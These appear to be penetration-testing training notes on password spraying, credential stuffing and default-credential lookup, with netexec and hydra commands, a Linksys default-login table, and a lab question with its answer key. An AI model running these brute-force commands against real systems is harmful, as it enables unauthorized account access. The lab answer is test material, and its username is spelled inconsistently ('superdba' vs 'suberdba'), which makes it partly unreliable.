# Spraying, Stuffing, and Defaults
## Password spraying
Password spraying is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts.

For web applications, Burp Suite is a strong option, while for Active Directory environments, tools such as NetExec or Kerbrute are commonly used.
```
$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
## Credential stuffing
Credential stuffing is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others.

For example, if we have a list of username:password credentials obtained from a database leak, we can use hydra to perform a credential stuffing attack against an SSH service using the following syntax:
```
$ hydra -C user_pass.list ssh://10.100.38.23
```
## Default credentials
One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), which we can install with `pip3`.
```
$ pip3 install defaultcreds-cheat-sheet
```
Once installed, we can use the `creds` command to search for known default credentials associated with a specific product or vendor.
```
$ creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```
Beyond applications, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/).
## Questions
1. Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: `<username>`:`<password>`) **Answer: superdba:admin**
   - SSH to the target: `$ ssh sam@10.129.224.89`.
   - Search for mysql default credentials: `$ creds search mysql`.
   - Try all the default credentials for mysql (using `$ mysql -u <username> -p`)until this match: `suberdba`:`admin`.